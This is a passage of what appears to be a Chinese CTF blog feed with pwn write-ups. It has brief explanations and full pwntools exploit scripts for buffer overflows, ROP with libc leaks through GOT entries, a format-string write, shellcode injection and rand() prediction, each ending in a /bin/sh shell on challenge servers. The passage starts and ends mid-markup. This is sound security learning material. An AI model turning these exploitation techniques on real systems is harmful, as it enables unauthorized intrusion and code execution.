class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">59473</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What's Your Birth?\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What's Your Name?\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">8</span> + p64(<span class="number">1926</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>先checksec一下</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575532324737.png" alt="1575532324737"></p><p>64位</p><p>bss数据区覆盖一下就可以</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">33733</span>)</span><br><span class="line">p.recvuntil(<span class="string">"lets get helloworld for bof\n"</span>)</span><br><span class="line">x = hex(<span class="number">1853186401</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">payload = <span class="string">"BBBB"</span> + p64(<span class="number">0x6e756161</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure><p>注意：</p><p>p64这类打包函数不可以使用例如x = hex(11)这类的函数</p><p>而可以使用直接对变量赋值的变量例如x = 11</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>先check</p><p><strong><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575536109047.png" alt="1575536109047"></strong></p><p>看IDA</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_</span><br><span class="line">        </span><br><span class="line">        level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">59602</span>)</span><br><span class="line">bin_add = <span class="number">0x400596</span></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">8</span>)  + p64(bin_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>这里的话就是构造32位程序的ROP链</p><p>注意这种问题在使用elf.symbols()获取的system（）函数的地址</p><p>32位会出现，64位应该不会，所以32位多填充p32(),64位多填充p64()</p><p>也就是说只要是搜索出的call system（不是自己定义的危险函数）在system 与其后面的参数之间就要间隔对应的参数</p><p>很简单，但是遇到了一个问题</p><p>1.如果直接使用后text段的system地址的话，就很好说，不用废话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">32152</span>)</span><br><span class="line">bin_add = <span class="number">0x0804a024</span></span><br><span class="line">sys_add = <span class="number">0x804849e</span></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_add)  + p32(bin_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>2.但是如果使用.plt段的system函数的真实地址的话就不大行了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">32152</span>)</span><br><span class="line">bin_add = <span class="number">0x0804a024</span></span><br><span class="line">sys_add = <span class="number">0x8048320</span></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_add)+ <span class="string">"a"</span> *<span class="number">4</span>  + p32(bin_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>具体是因为什么我也不清楚</p><p>总之先记住</p><p>如果是从libc泄露的system的话。。。。应该是第二种了吧</p><p>看下我自己的认为。。</p><p>在使用.plt段的system时</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575550541723.png" alt="1575550541723"></p><p>看这个哈</p><p>我们输入的bin/sh因该位于ptr 向后4个的位置，往后看你会发先会有一个call的指令</p><p>我们都知道call会向栈中push一个下一条指令的地址（貌似是在str的位置，具体也不清楚）</p><p>因此我们要先将这个地址覆盖之后我们才可以传入bin/sh</p><p>就先这样理解吧。。。。</p><p>其实刚才那样理解就是这个意思：</p><h5 id="跟栈帧结构有关，每个函数的栈结构是实参‘-bin-sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行"><a href="#跟栈帧结构有关，每个函数的栈结构是实参‘-bin-sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行" class="headerlink" title="跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行"></a>跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行</h5><p>就先这样吧。。</p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>先增加一个知识，函数指针</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575594271298.png" alt="1575594271298"></p><p><a href="http://c.biancheng.net/view/228.html" target="_blank" rel="noopener">http://c.biancheng.net/view/228.html</a></p><p>关于函数指针的介绍</p><p>再来看这里</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575594310241.png" alt="1575594310241"></p><p>这里把v1这个void类型指针先强制类型转化为一个返回八字节的函数指针</p><p>通过read函数向其赋值地址</p><p>再来增加几个知识：</p><p>alarm()可以用来限制运行时间，干扰调试</p><p>mmap（）可以开辟出一片可读可写的内存空间</p><p>我们来找偏移</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575600921737.png" alt="1575600921737"></p><p>从IDA上可以看到，我们可以a1的地址存放到偏移量为7的地方，所以构造以下字符串</p><p>构造payload = %85d%7&amp;n</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">54738</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v3 = p.recvline().strip(<span class="string">"\n"</span>)</span><br><span class="line">v3_add = int((<span class="string">"0x"</span> + str(v3)),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> v3_add</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What should your character's name be:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"So, where you will go?east or up?:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"o into there(1), or leave(0)?:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"'Give me an address'\n"</span>)</span><br><span class="line">p.sendline(str(v3_add))</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"And, you wish is:\n"</span>)</span><br><span class="line">payload = <span class="string">"%85c%7$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Wizard: I will help you! USE YOU SPELL\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcode</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意：！！！！！</p><p>在写shellcode的时候最好加一下context</p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><h3 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h3><p>​        srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned  int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。</p><h3 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h3><p>​        rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。<br>​         rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。</p><p>这里用到了python与c语言交互的一个库</p><p>关于ctype库与dll<br>我们使用python标准库中自带的ctypes模块进行python和c的混合编程<br>libc共享库<br>可以使用ldd查找</p><p>注意，我们在使用sendlineafter()函数的时候不可以加上\n，这样的话是无法识别的</p><p>同时输入的为字符串形式</p><p>上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">38308</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#print p.recvuntil("Your name:\n")</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">32</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">p.sendlineafter(<span class="string">"number:"</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h1 id="9-整数溢出"><a href="#9-整数溢出" class="headerlink" title="9 整数溢出"></a>9 整数溢出</h1><p>知识点：整数溢出</p><p>详情见自己写的博客或ctf_wiki</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#Author:summerN</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">51446</span>)</span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">payload1 = <span class="string">"1"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">payload2 = <span class="string">"summerN"</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line">payload3 = <span class="string">"a"</span> * (<span class="number">0x14</span> + <span class="number">4</span>) + p32(<span class="number">0x804868b</span>)</span><br><span class="line">payload3 = payload3.ljust(<span class="number">259</span>,<span class="string">'b'</span>) <span class="comment">#范围</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>一个通过栈溢出漏洞使用write函数泄露libc基地址的题目</p><p>libc文件题目已经给出</p><p>获取基地址后基本的rop</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./level3'</span></span><br><span class="line">libc_name = <span class="string">'libc_32.so.6'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'42539'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">libc_got = elf.got[<span class="string">"__libc_start_main"</span>]</span><br><span class="line"><span class="comment">#print libc_got</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">main = <span class="number">0x8048484</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span> * (offset + <span class="number">4</span>) + p32(write_plt) + p32(main)  <span class="comment">#此处的main未返回地址</span></span><br><span class="line">payload1 +=   p32(<span class="number">1</span>) + p32(libc_got) + p32(<span class="number">4</span>)<span class="comment">#使用write泄露libc基地址</span></span><br><span class="line"><span class="keyword">print</span> payload1</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.recvuntil('@\n')</span></span><br><span class="line">write_add = u32(p.recv(<span class="number">4</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">4</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_add)</span><br><span class="line"></span><br><span class="line">libc_add = write_add - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">sys_add = libc_add + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_add = libc_add + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span> * (offset + <span class="number">4</span>) + p32(sys_add) + <span class="string">'aaaa'</span> + p32(bin_add)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Input:\n"</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安恒月赛暨北京工业大学</title>
      <link href="/2019/12/21/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%9A%A8%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6/"/>
      <url>/2019/12/21/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%9A%A8%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="安恒月赛暨北京工业大学"><a href="#安恒月赛暨北京工业大学" class="headerlink" title="安恒月赛暨北京工业大学"></a>安恒月赛暨北京工业大学</h1><a id="more"></a><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1-fantasy"><a href="#1-fantasy" class="headerlink" title="1.fantasy"></a>1.fantasy</h3><p>简单的栈溢出</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./fantasy'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'183.129.189.60'</span></span><br><span class="line">port = <span class="string">'10025'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">sys_add = <span class="number">0x400735</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(sys_add)</span><br><span class="line">p.recvuntil(<span class="string">"input your message\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2-how-do-cannary-work"><a href="#2-how-do-cannary-work" class="headerlink" title="2.how do cannary work"></a>2.how do cannary work</h3><p>这个题没有cannary保护</p><p>但是有挨千杀的出题人写的canary</p><p>这个cannary是由malloc传入的</p><p>用过gdb调试后发现是由两个变量比较</p><p>其中一个变量引入的是地址</p><p>另一个变量保存了进行check的字符串</p><p>我们只需找一个内存为0的地址传入，之后覆盖掉另一个变量为0即可</p><p>剩下的即为简单rop，调用puts泄露libc之后rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./my_cannary'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'183.129.189.60'</span></span><br><span class="line">port = <span class="string">'10026'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">offset = <span class="number">0x40</span></span><br><span class="line"><span class="comment">#puts_plt = elf.plt['puts']</span></span><br><span class="line">puts_plt = <span class="number">0x400670</span></span><br><span class="line"><span class="keyword">print</span> puts_plt</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> puts_got</span><br><span class="line">pop_add = <span class="number">0x400a43</span></span><br><span class="line">main_add = <span class="number">0x400998</span></span><br><span class="line">backdoor = <span class="number">0x000000000600fe8</span> <span class="comment">#地址指向为0</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span> * <span class="number">0x30</span> + p64(backdoor) + p64(<span class="number">0x0</span>) + <span class="string">"a"</span> * <span class="number">8</span> + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)</span><br><span class="line">p.recvuntil(<span class="string">"n\n"</span>)</span><br><span class="line"><span class="comment">#payload1 = "a" * (offset + 8) + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recvall()</span></span><br><span class="line">put_add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> put_add</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,put_add)</span><br><span class="line">libc_add = put_add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"n\n"</span>)</span><br><span class="line">payload2 = <span class="string">"a"</span> * <span class="number">0x30</span> + p64(backdoor) + p64(<span class="number">0x0</span>) + <span class="string">"a"</span> * <span class="number">8</span> + p64(pop_add)</span><br><span class="line">payload2 += p64(bin_add) + p64(sys_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF</title>
      <link href="/2019/12/16/SWPUCTF/"/>
      <url>/2019/12/16/SWPUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><a id="more"></a><p>先check</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638684522.png" alt="1575638684522"></p><p>还可以、</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638774113.png" alt="1575638774113"></p><p>这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh）</p><p>难度在于</p><p>1.查找libc版本</p><p>2.改写链的地址</p><p>3.对于改写的话需要一个一个字节的去改写，具体看脚本</p><p> <a href="C:\Users\Administrator\Desktop\login.py">login.py</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 